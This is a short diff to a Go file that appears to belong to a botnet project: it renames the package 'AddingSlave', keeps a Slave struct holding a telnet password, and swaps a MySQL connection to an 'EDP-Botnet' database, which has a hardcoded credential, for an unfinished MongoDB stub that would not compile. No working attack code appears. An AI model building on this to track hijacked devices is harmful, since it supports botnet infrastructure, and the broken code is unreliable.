@@ -1,8 +1,11 @@
-package main
+package AddingSlave
 
 import (
-  import "database/sql"
-  import _ "github.com/go-sql-driver/mysql"
+  "fmt"
+  "time"
+  "context"
+  "go.mongodb.org/mongo-driver/mongo"
+  "go.mongodb.org/mongo-driver/mongo/options"
 )
 
 type Slave struct{
@@ -10,15 +13,13 @@ type Slave struct{
   senhaTelnet string
 }
 
-func db_connect(databaseSource string) (*DB){
-  db, err := sql.Open("mysql",databaseSource)
-  if err != nil{
-    panic(err)
-  }
-  return db
-}
 
-func main(){
-  db:=db_connect("B0tN3t:45p1r1n4@/EDP-Botnet")
+func connect_mongo(){
+  fmt.Println("Mongodb")
+
+  ctx, _ := context.WithTimeout(context.Background(), 10*time.Second)
+  client, err = mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
+
+
 
 }
